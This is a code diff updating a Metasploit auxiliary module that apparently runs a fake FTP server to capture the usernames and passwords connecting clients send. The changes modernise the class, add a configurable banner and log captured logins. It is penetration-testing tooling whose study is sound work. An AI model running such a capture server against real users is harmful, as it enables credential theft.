@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
@@ -21,7 +18,7 @@ class Metasploit3 < Msf::Auxiliary
       'License'     => MSF_LICENSE,
       'Actions'     =>
         [
-          [ 'Capture' ]
+          [ 'Capture', 'Description' => 'Run FTP capture server' ]
         ],
       'PassiveActions' =>
         [
@@ -32,8 +29,9 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 21 ])
-      ], self.class)
+        OptPort.new('SRVPORT',  [ true, "The local port to listen on.", 21 ]),
+        OptString.new('BANNER', [ true, "The server banner",  'FTP Server Ready'])
+      ])
   end
 
   def setup
@@ -42,13 +40,12 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
     exploit()
   end
 
   def on_client_connect(c)
     @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
-    c.put "220 FTP Server Ready\r\n"
+    c.put "220 #{datastore['BANNER']}\r\n"
   end
 
   def report_cred(opts)
@@ -106,7 +103,7 @@ class Metasploit3 < Msf::Auxiliary
         proof: arg
       )
 
-      print_status("FTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+      print_good("FTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
     end
 
     @state[c][:pass] = data.strip
